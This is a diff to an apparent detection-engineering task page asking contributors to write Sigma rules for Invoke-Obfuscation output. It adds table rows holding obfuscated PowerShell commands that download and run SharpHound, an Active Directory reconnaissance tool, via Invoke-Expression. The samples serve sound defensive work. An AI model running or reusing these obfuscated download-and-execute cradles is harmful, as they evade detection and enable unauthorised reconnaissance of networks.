@@ -15,7 +15,7 @@ Import-Module ./Invoke-Obfuscation.psd1
 Invoke-Obfuscation
 SET SCRIPTBLOCK Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound
 ```
-### Just pick up the Case # you prefer and write a Sigma rule for it. When you're done, create a Pull Request to OSCD Sigma branch and specify this issue's number and the number of the case you solved (e.g., "Develop Sigma rules for Invoke-Obfuscation #578 Case #1")
+### Just pick up the Case # you prefer and write a Sigma rule for it. When you're done, create a Pull Request to OSCD Sigma branch and specify this issue's number and the number of the case you solved (*e.g., "Develop Sigma rules for Invoke-Obfuscation #578 Case #1"*)
 
 | Case # | Option #1 | Option #2 | Option #3 | Result |
 | :---: | :---: | :---: | :---: | --- |
@@ -28,3 +28,7 @@ SET SCRIPTBLOCK Invoke-Expression (New-Object Net.WebClient).DownloadString('htt
 | 7 | TOKEN | TOKEN\ARGUMENT | TOKEN\ARGUMENT\2 | Invoke-Expression (New-Object Net`.W`eBcL`ie`NT).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound
 | 8 | TOKEN | TOKEN\ARGUMENT | TOKEN\ARGUMENT\3 | Invoke-Expression (New-Object ('Net'+'.W'+'ebClie'+'nt')).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound
 | 9 | TOKEN | TOKEN\ARGUMENT | TOKEN\ARGUMENT\4 | Invoke-Expression (New-Object ("{2}{3}{1}{0}"-f'ent','ebCli','Net.','W')).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound 
+| 10 | TOKEN | TOKEN\MEMBER | TOKEN\MEMBER\1 | Invoke-Expression (New-Object Net.WebClient).DOwNlOadsTriNg('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound
+| 11 | TOKEN | TOKEN\MEMBER | TOKEN\MEMBER\2 | Invoke-Expression (New-Object Net.WebClient)."Dow`NL`oaDST`R`ING"('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound
+| 12 | TOKEN | TOKEN\MEMBER | TOKEN\MEMBER\3 | Invoke-Expression (New-Object Net.WebClient).('Dow'+'nloadStrin'+'g').Invoke('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound
+| 13 | TOKEN | TOKEN\MEMBER | TOKEN\MEMBER\4 | Invoke-Expression (New-Object Net.WebClient).("{3}{2}{1}{0}" -f'g','nloadStrin','ow','D').Invoke('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound
